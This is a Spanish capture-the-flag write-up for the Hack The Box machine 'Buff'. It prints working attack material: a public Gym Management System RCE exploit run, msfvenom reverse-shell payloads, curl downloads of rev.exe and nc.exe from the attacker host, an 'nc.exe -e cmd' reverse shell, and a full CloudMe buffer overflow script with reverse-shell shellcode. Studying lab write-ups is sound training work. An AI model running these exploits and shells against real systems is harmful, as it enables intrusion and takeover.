---
tags:
title: Buff - Easy (HTB)
permalink: /Buff-HTB-Writeup
toc: true
toc_label: Topics
toc_sticky: true
sidebar: main
---
---
# Reconocimiento 

```bash
nmap -sCV -p8080 10.129.2.18                                  
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-07 18:54 -03
Nmap scan report for buff.htb (10.129.2.18)
Host is up (0.61s latency).

PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)
|_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6
|_http-title: mrb3n's Bro Hut
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported:CONNECTION

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 48.06 seconds
```

# Service enumeration

Debido a que el unico puerto es el `8080` nos dirigimos a la pagina 

![{82205699-1F95-412D-B2CF-AE1C72755C6D}](images/{82205699-1F95-412D-B2CF-AE1C72755C6D}.png)

Probando con credenciales random en el apartado de login, nos sale el siguiente error.

![{80EF5136-67FA-4A6F-9961-98436DAB8C3D}](images/{80EF5136-67FA-4A6F-9961-98436DAB8C3D}.png)

## Wfuzz enumeration

```bash
wfuzz -c -t 200 -u http://buff.htb:8080/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt --hh=1052
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz''s documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://buff.htb:8080/FUZZ
Total requests: 220559

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                  
=====================================================================

000000039:   301        9 L      30 W       333 Ch      "img"                                            
000000086:   301        9 L      30 W       337 Ch      "profile"
000000366:   301        9 L      30 W       336 Ch      "upload"                                     
000000679:   200        338 L    2953 W     18025 Ch    "license"                               
000000902:   503        39 L     98 W       1054 Ch     "examples"                               
000001112:   301        9 L      30 W       337 Ch      "include"                               
000001819:   403        45 L     113 W      1199 Ch     "licenses"                                
000002924:   301        9 L      30 W       337 Ch      "Profile"
000003295:   200        338 L    2953 W     18025 Ch    "LICENSE"        
000003668:   301        9 L      30 W       333 Ch      "att"        
000003790:   403        42 L     97 W       1040 Ch     "%20"        
000004182:   301        9 L      30 W       333 Ch      "IMG"        
000005713:   200        338 L    2953 W     18025 Ch    "License"      
000005853:   301        9 L      30 W       332 Ch      "ex"     
000007004:   403        42 L     97 W       1040 Ch     "*checkout*"
```

Vemso que detecta una ruta `/uploads`, pero yendo a la misma no nos deja listar contenido
## Shell as shaun
![{5A028301-DBCD-4278-B347-8FBF58DD8DAE}](images/{5A028301-DBCD-4278-B347-8FBF58DD8DAE}.png)

En el apartado de `contact` de la propia pagina, tambien no hay nada de nada excepto una descripcion indicando el uso de software de `Gym` con la version `1.0`, y buscando por exploit para algo con la palabra Gym, vemos un exploit que nos Permite `Ejecucion remota de comandos (RCE)` sin estar autenticados.

```bash
searchsploit Gym                
-------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                          |  Path
-------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Gym Management System 1.0 - 'id' SQL Injection                                                                                                          | php/webapps/48936.txt
Gym Management System 1.0 - Authentication Bypass                                                                                                       | php/webapps/48940.txt
Gym Management System 1.0 - Stored Cross Site Scripting                                                                                                 | php/webapps/48941.txt
Gym Management System 1.0 - Unauthenticated Remote Code Execution                                                                                       | php/webapps/48506.py
GYM MS - GYM Management System - Cross Site Scripting (Stored)                                                                                          | php/webapps/51777.txt
WordPress Plugin WPGYM - SQL Injection                                                                                                                  | php/webapps/42801.txt
-------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

Lo descargamos en nuestra maquina.

```bash
searchsploit -m php/webapps/48506.py     
  Exploit: Gym Management System 1.0 - Unauthenticated Remote Code Execution
      URL: https://www.exploit-db.com/exploits/48506
     Path: /usr/share/exploitdb/exploits/php/webapps/48506.py
    Codes: N/A
 Verified: False
File Type: Python script, ASCII text executable
Copied to: /home/zsln/Desktop/zsln/htb/buff/48506.py
```

Lo renombramos
```bash
mv 48506.py ex.py 
```

Y lo ejecutamos pasandole como argumento la ip de la maquina.

```bash
python2.7 ex.py http://buff.htb:8080/
            /\
/vvvvvvvvvvvv \--------------------------------------,
`^^^^^^^^^^^^ /============BOKU====================="
            \/

[+] Successfully connected to webshell.
C:\xampp\htdocs\gym\upload> whoami
�PNG
▒
buff\shaun
```

Como vemos que intentando ejecutar comando no tenemos exito, nos podemos enviar una shell a nuestra otra consola con `powershell` o mejor con metasploit, podemos crear un `.exe` el cual desde la shell victima ejecutamos asi recibimos una shell por `meterpreter`

```bash
C:\xampp\htdocs\gym\upload> whoami /priv
�PNG
▒

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                          State   
============================= ==================================== ========
SeShutdownPrivilege           Shut down the system                 Disabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled 
SeUndockPrivilege             Remove computer from docking station Disabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
SeTimeZonePrivilege           Change the time zone                 Disabled

C:\xampp\htdocs\gym\upload> cd C:\Users
�PNG
▒
```

Creamos el payload con `msfvenom`.

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.17.19 LPORT=4444 -f exe -o rev.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of exe file: 7680 bytes
Saved as: rev.exe
```

Lo subimos a la maquina con `curl`.

```bash
curl http://10.10.17.19/rev.exe -o rev.exe
```

```bash
python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.129.2.18 - - [07/Nov/2025 19:22:46] "GET / HTTP/1.1" 200 -
10.129.2.18 - - [07/Nov/2025 19:23:13] "GET /rev.exe HTTP/1.1" 200 -
```

Seteamos la configuracion con metasploit.
```bash
msf > use multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf exploit(multi/handler) > set lhost 10.10.17.19
lhost => 10.10.17.19
msf exploit(multi/handler) > set lport 4444
lport => 4444
```

Lo corremos.

```bash
msf exploit(multi/handler) > run
[*] Started reverse TCP handler on 10.10.17.19:4444
```

Pero si ejecutamos el binario desde la maquina vemos que no va a ejecutarse, por lo que tambien podriamos optar por enviarnos una shell con `nc.exe`.

```bash
curl http://10.10.17.19/nc.exe -o C:\Programdata\nc.exe
```

Y enviamos la shell.

```powershell
C:\xampp\htdocs\gym\upload> C:\Programdata\nc.exe 10.10.17.19 8888 -e cmd
```

Y vemos que desde nuestra consola, nos llega nuestra shell.

```bash
sudo nc -nlvp 8888            
[sudo] password for zsln: 
listening on [any] 8888 ...
connect to [10.10.17.19] from (UNKNOWN) [10.129.2.18] 49915
Microsoft Windows [Version 10.0.17134.1610]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\xampp\htdocs\gym\upload>
```

## Shell as administrator

### Enumeration

```powershell
PS C:\xampp\htdocs> netstat -ano                                                           
netstat -ano                                                                               
                                                                                           
Active Connections                                                                         
                                                                                           
  Proto  Local Address          Foreign Address        State           PID
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       928
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:5040           0.0.0.0:0              LISTENING       6444
  TCP    0.0.0.0:7680           0.0.0.0:0              LISTENING       8760
  TCP    0.0.0.0:8080           0.0.0.0:0              LISTENING       8964
  TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING       512
  TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING       1116
  TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING       1692
  TCP    0.0.0.0:49667          0.0.0.0:0              LISTENING       2200
  TCP    0.0.0.0:49668          0.0.0.0:0              LISTENING       656
  TCP    0.0.0.0:49669          0.0.0.0:0              LISTENING       676
  TCP    10.129.2.18:139        0.0.0.0:0              LISTENING       4
  TCP    10.129.2.18:8080       10.10.17.19:47192      ESTABLISHED     8964
  TCP    10.129.2.18:49915      10.10.17.19:8888       ESTABLISHED     9516
  TCP    127.0.0.1:3306         0.0.0.0:0              LISTENING       9092
  TCP    127.0.0.1:8888         0.0.0.0:0              LISTENING       10108
  TCP    [::]:135               [::]:0                 LISTENING       928
  TCP    [::]:445               [::]:0                 LISTENING       4
  TCP    [::]:7680              [::]:0                 LISTENING       8760
  TCP    [::]:8080              [::]:0                 LISTENING       8964
  TCP    [::]:49664             [::]:0                 LISTENING       512
  TCP    [::]:49665             [::]:0                 LISTENING       1116
  TCP    [::]:49666             [::]:0                 LISTENING       1692
  TCP    [::]:49667             [::]:0                 LISTENING       2200
  TCP    [::]:49668             [::]:0                 LISTENING       656
  TCP    [::]:49669             [::]:0                 LISTENING       676
 [..snip..]
```

Vemos que hay varios puertos abiertos internamente en la maquina, pero el que me interesa es el `8888`, si bsucamos que es lo que se esta ejecutando, es un `.exe`

```powershell
C:\>tasklist /v | findstr 2820
tasklist /v | findstr 2820
CloudMe.exe                   2820                            0     37,444 K Unknown         N/A                                                     0:00:00 N/A 
```

El mismo esta en el directorio de `shaun`.

```powershell
C:\users\shaun\downloads>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is A22D-49F7

 Directory of C:\users\shaun\downloads

14/07/2020  12:27    <DIR>          .
14/07/2020  12:27    <DIR>          ..
16/06/2020  15:26        17,830,824 CloudMe_1112.exe
               1 File(s)     17,830,824 bytes
               2 Dir(s)   9,787,985,920 bytes free
```

Podria buscar una vuln con respecto al nombre del este binario y vamos a encontrar que probablemente se trate de un `BOF Buffer Overflow`.

```bash
searchsploit cloudme                     
-------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                          |  Path
-------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
CloudMe 1.11.2 - Buffer Overflow (PoC)                                                                                                                  | windows/remote/48389.py
CloudMe 1.11.2 - Buffer Overflow (SEH_DEP_ASLR)                                                                                                         | windows/local/48499.txt
CloudMe 1.11.2 - Buffer Overflow ROP (DEP_ASLR)                                                                                                         | windows/local/48840.py
```

Se trata de un BOF, pero el codigo lo tenemos que modificar ligeramente.

```python
# Exploit Title: CloudMe 1.11.2 - Buffer Overflow (PoC)
# Date: 2020-04-27
# Exploit Author: Andy Bowden
# Vendor Homepage: https://www.cloudme.com/en
# Software Link: https://www.cloudme.com/downloads/CloudMe_1112.exe
# Version: CloudMe 1.11.2
# Tested on: Windows 10 x86

#Instructions:
# Start the CloudMe service and run the script.

import socket

target = "127.0.0.1"

padding1   = b"\x90" * 1052
EIP        = b"\xB5\x42\xA8\x68" # 0x68A842B5 -> PUSH ESP, RET
NOPS       = b"\x90" * 30

#msfvenom -a x86 -p windows/exec CMD=calc.exe -b '\x00\x0A\x0D' -f python
payload    = b"\xba\xad\x1e\x7c\x02\xdb\xcf\xd9\x74\x24\xf4\x5e\x33"
payload   += b"\xc9\xb1\x31\x83\xc6\x04\x31\x56\x0f\x03\x56\xa2\xfc"
payload   += b"\x89\xfe\x54\x82\x72\xff\xa4\xe3\xfb\x1a\x95\x23\x9f"
payload   += b"\x6f\x85\x93\xeb\x22\x29\x5f\xb9\xd6\xba\x2d\x16\xd8"
payload   += b"\x0b\x9b\x40\xd7\x8c\xb0\xb1\x76\x0e\xcb\xe5\x58\x2f"
payload   += b"\x04\xf8\x99\x68\x79\xf1\xc8\x21\xf5\xa4\xfc\x46\x43"
payload   += b"\x75\x76\x14\x45\xfd\x6b\xec\x64\x2c\x3a\x67\x3f\xee"
payload   += b"\xbc\xa4\x4b\xa7\xa6\xa9\x76\x71\x5c\x19\x0c\x80\xb4"
payload   += b"\x50\xed\x2f\xf9\x5d\x1c\x31\x3d\x59\xff\x44\x37\x9a"
payload   += b"\x82\x5e\x8c\xe1\x58\xea\x17\x41\x2a\x4c\xfc\x70\xff"
payload   += b"\x0b\x77\x7e\xb4\x58\xdf\x62\x4b\x8c\x6b\x9e\xc0\x33"
payload   += b"\xbc\x17\x92\x17\x18\x7c\x40\x39\x39\xd8\x27\x46\x59"
payload   += b"\x83\x98\xe2\x11\x29\xcc\x9e\x7b\x27\x13\x2c\x06\x05"
payload   += b"\x13\x2e\x09\x39\x7c\x1f\x82\xd6\xfb\xa0\x41\x93\xf4"
payload   += b"\xea\xc8\xb5\x9c\xb2\x98\x84\xc0\x44\x77\xca\xfc\xc6"
payload   += b"\x72\xb2\xfa\xd7\xf6\xb7\x47\x50\xea\xc5\xd8\x35\x0c"
payload   += b"\x7a\xd8\x1f\x6f\x1d\x4a\xc3\x5e\xb8\xea\x66\x9f"

overrun    = b"C" * (1500 - len(padding1 + NOPS + EIP + payload))

buf = padding1 + EIP + NOPS + payload + overrun

try:
        s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target,8888))
        s.send(buf)
except Exception as e:
        print(sys.exc_value) 
```

Ya que por defecto se envia un payload a nivel local y listo, pero lo voy a modificar ligeramente con un `shellcode`, el cual voy a crear con `msfvenom`, haciendo que el payload me envie la shell a mi maquina la cual voy a estar en escucha con nc.
Creamos el payload.

```bash
 msfvenom -a x86 -p windows/shell_reverse_tcp LHOST=10.10.17.19 LPORT=443 -f python -v payload -b '\x00\x0A\x0D'
 ```
 
 ```bash
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 351 (iteration=0)
x86/shikata_ga_nai chosen with final size 351
Payload size: 351 bytes
Final size of python file: 1899 bytes
payload =  b""
payload += b"\xdd\xc2\xd9\x74\x24\xf4\x5f\xbd\x3e\x9a\x27"
payload += b"\x15\x2b\xc9\xb1\x52\x31\x6f\x17\x03\x6f\x17"
payload += b"\x83\xf9\x9e\xc5\xe0\xf9\x77\x8b\x0b\x01\x88"
payload += b"\xec\x82\xe4\xb9\x2c\xf0\x6d\xe9\x9c\x72\x23"
payload += b"\x06\x56\xd6\xd7\x9d\x1a\xff\xd8\x16\x90\xd9"
payload += b"\xd7\xa7\x89\x1a\x76\x24\xd0\x4e\x58\x15\x1b"
payload += b"\x83\x99\x52\x46\x6e\xcb\x0b\x0c\xdd\xfb\x38"
payload += b"\x58\xde\x70\x72\x4c\x66\x65\xc3\x6f\x47\x38"
payload += b"\x5f\x36\x47\xbb\x8c\x42\xce\xa3\xd1\x6f\x98"
payload += b"\x58\x21\x1b\x1b\x88\x7b\xe4\xb0\xf5\xb3\x17"
payload += b"\xc8\x32\x73\xc8\xbf\x4a\x87\x75\xb8\x89\xf5"
payload += b"\xa1\x4d\x09\x5d\x21\xf5\xf5\x5f\xe6\x60\x7e"
payload += b"\x53\x43\xe6\xd8\x70\x52\x2b\x53\x8c\xdf\xca"
payload += b"\xb3\x04\x9b\xe8\x17\x4c\x7f\x90\x0e\x28\x2e"
payload += b"\xad\x50\x93\x8f\x0b\x1b\x3e\xdb\x21\x46\x57"
payload += b"\x28\x08\x78\xa7\x26\x1b\x0b\x95\xe9\xb7\x83"
payload += b"\x95\x62\x1e\x54\xd9\x58\xe6\xca\x24\x63\x17"
payload += b"\xc3\xe2\x37\x47\x7b\xc2\x37\x0c\x7b\xeb\xed"
payload += b"\x83\x2b\x43\x5e\x64\x9b\x23\x0e\x0c\xf1\xab"
payload += b"\x71\x2c\xfa\x61\x1a\xc7\x01\xe2\x2f\x12\x18"
payload += b"\xe1\x47\x20\x1a\x04\x23\xad\xfc\x6c\x43\xf8"
payload += b"\x57\x19\xfa\xa1\x23\xb8\x03\x7c\x4e\xfa\x88"
payload += b"\x73\xaf\xb5\x78\xf9\xa3\x22\x89\xb4\x99\xe5"
payload += b"\x96\x62\xb5\x6a\x04\xe9\x45\xe4\x35\xa6\x12"
payload += b"\xa1\x88\xbf\xf6\x5f\xb2\x69\xe4\x9d\x22\x51"
payload += b"\xac\x79\x97\x5c\x2d\x0f\xa3\x7a\x3d\xc9\x2c"
payload += b"\xc7\x69\x85\x7a\x91\xc7\x63\xd5\x53\xb1\x3d"
payload += b"\x8a\x3d\x55\xbb\xe0\xfd\x23\xc4\x2c\x88\xcb"
payload += b"\x75\x99\xcd\xf4\xba\x4d\xda\x8d\xa6\xed\x25"
payload += b"\x44\x63\x1d\x6c\xc4\xc2\xb6\x29\x9d\x56\xdb"
payload += b"\xc9\x48\x94\xe2\x49\x78\x65\x11\x51\x09\x60"
payload += b"\x5d\xd5\xe2\x18\xce\xb0\x04\x8e\xef\x90"
```

Ahora el script modificado quedaria asi.

```python
cat bof.py  
# Exploit Title: CloudMe 1.11.2 - Buffer Overflow (PoC)
# Date: 2020-04-27
# Exploit Author: Andy Bowden
# Vendor Homepage: https://www.cloudme.com/en
# Software Link: https://www.cloudme.com/downloads/CloudMe_1112.exe
# Version: CloudMe 1.11.2
# Tested on: Windows 10 x86

#Instructions:
# Start the CloudMe service and run the script.

import socket
import sys
target = "127.0.0.1"

padding1   = b"\x90" * 1052
EIP        = b"\xB5\x42\xA8\x68" # 0x68A842B5 -> PUSH ESP, RET
NOPS       = b"\x90" * 30


payload =  b""
payload += b"\xdd\xc2\xd9\x74\x24\xf4\x5f\xbd\x3e\x9a\x27"
payload += b"\x15\x2b\xc9\xb1\x52\x31\x6f\x17\x03\x6f\x17"
payload += b"\x83\xf9\x9e\xc5\xe0\xf9\x77\x8b\x0b\x01\x88"
payload += b"\xec\x82\xe4\xb9\x2c\xf0\x6d\xe9\x9c\x72\x23"
payload += b"\x06\x56\xd6\xd7\x9d\x1a\xff\xd8\x16\x90\xd9"
payload += b"\xd7\xa7\x89\x1a\x76\x24\xd0\x4e\x58\x15\x1b"
payload += b"\x83\x99\x52\x46\x6e\xcb\x0b\x0c\xdd\xfb\x38"
payload += b"\x58\xde\x70\x72\x4c\x66\x65\xc3\x6f\x47\x38"
payload += b"\x5f\x36\x47\xbb\x8c\x42\xce\xa3\xd1\x6f\x98"
payload += b"\x58\x21\x1b\x1b\x88\x7b\xe4\xb0\xf5\xb3\x17"
payload += b"\xc8\x32\x73\xc8\xbf\x4a\x87\x75\xb8\x89\xf5"
payload += b"\xa1\x4d\x09\x5d\x21\xf5\xf5\x5f\xe6\x60\x7e"
payload += b"\x53\x43\xe6\xd8\x70\x52\x2b\x53\x8c\xdf\xca"
payload += b"\xb3\x04\x9b\xe8\x17\x4c\x7f\x90\x0e\x28\x2e"
payload += b"\xad\x50\x93\x8f\x0b\x1b\x3e\xdb\x21\x46\x57"
payload += b"\x28\x08\x78\xa7\x26\x1b\x0b\x95\xe9\xb7\x83"
payload += b"\x95\x62\x1e\x54\xd9\x58\xe6\xca\x24\x63\x17"
payload += b"\xc3\xe2\x37\x47\x7b\xc2\x37\x0c\x7b\xeb\xed"
payload += b"\x83\x2b\x43\x5e\x64\x9b\x23\x0e\x0c\xf1\xab"
payload += b"\x71\x2c\xfa\x61\x1a\xc7\x01\xe2\x2f\x12\x18"
payload += b"\xe1\x47\x20\x1a\x04\x23\xad\xfc\x6c\x43\xf8"
payload += b"\x57\x19\xfa\xa1\x23\xb8\x03\x7c\x4e\xfa\x88"
payload += b"\x73\xaf\xb5\x78\xf9\xa3\x22\x89\xb4\x99\xe5"
payload += b"\x96\x62\xb5\x6a\x04\xe9\x45\xe4\x35\xa6\x12"
payload += b"\xa1\x88\xbf\xf6\x5f\xb2\x69\xe4\x9d\x22\x51"
payload += b"\xac\x79\x97\x5c\x2d\x0f\xa3\x7a\x3d\xc9\x2c"
payload += b"\xc7\x69\x85\x7a\x91\xc7\x63\xd5\x53\xb1\x3d"
payload += b"\x8a\x3d\x55\xbb\xe0\xfd\x23\xc4\x2c\x88\xcb"
payload += b"\x75\x99\xcd\xf4\xba\x4d\xda\x8d\xa6\xed\x25"
payload += b"\x44\x63\x1d\x6c\xc4\xc2\xb6\x29\x9d\x56\xdb"
payload += b"\xc9\x48\x94\xe2\x49\x78\x65\x11\x51\x09\x60"
payload += b"\x5d\xd5\xe2\x18\xce\xb0\x04\x8e\xef\x90"

overrun    = b"C" * (1500 - len(padding1 + NOPS + EIP + payload))

buf = padding1 + EIP + NOPS + payload + overrun

try:
        s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target,8888))
        s.send(buf)
except Exception as e:
        print(sys.exc_value)
```

Ahora nos queda traernos localmente el peurto `8888` con chisel.

Iniciamso chisel en nuestra maquina en modo servidor
```bash
chisel server -p 5555 -reverse
2025/11/07 19:47:41 server: Reverse tunnelling enabled
2025/11/07 19:47:41 server: Fingerprint S90alZJDnW6dNNZlN1GuA/ZtIagoncdH/du8nuGGAa8=
2025/11/07 19:47:41 server: Listening on http://0.0.0.0:5555
2025/11/07 19:58:16 server: session#1: Client version (1.11.3) differs from server version (1.11.3-0kali1)
```

Y desde la maquina victima

```powershell
c:\ProgramData>.\chisel.exe client 10.10.17.19:5555 R:8888:localhost:8888
.\chisel.exe client 10.10.17.19:5555 R:8888:localhost:8888
2025/11/07 23:03:21 client: Connecting to ws://10.10.17.19:5555
2025/11/07 23:03:29 client: Connected (Latency 406.3509ms)
```

Es asi como ahora vemos que el puerto `8888` esta ocupado.

```bash
netstat -tulpn
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:38213         0.0.0.0:*               LISTEN      1163/containerd     
tcp        0      0 127.0.0.1:1080          0.0.0.0:*               LISTEN      7737/chisel         
tcp6       0      0 :::8888                 :::*                    LISTEN      7737/chisel         
tcp6       0      0 :::5555                 :::*                    LISTEN      7737/chisel         
udp6       0      0 fe80::20c:29ff:fe81:546 :::*                                869/NetworkManager  
```

Asi que ahora ejecutamos el script.

```bash
python3 bof.py
```

Y desde nuestra otra consola recibimos la shell como `Administrator`.

```powershell
 sudo nc -nlvp 443 
listening on [any] 443 ...
connect to [10.10.17.19] from (UNKNOWN) [10.129.2.18] 49938
Microsoft Windows [Version 10.0.17134.1610]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
buff\administrator
```

```powershell
C:\Windows\system32>type c:\users\administrator\desktop\root.txt
type c:\users\administrator\desktop\root.txt
9627d1a09daccb39d1b579860656a7d0
```

`~Happy Hacking.`

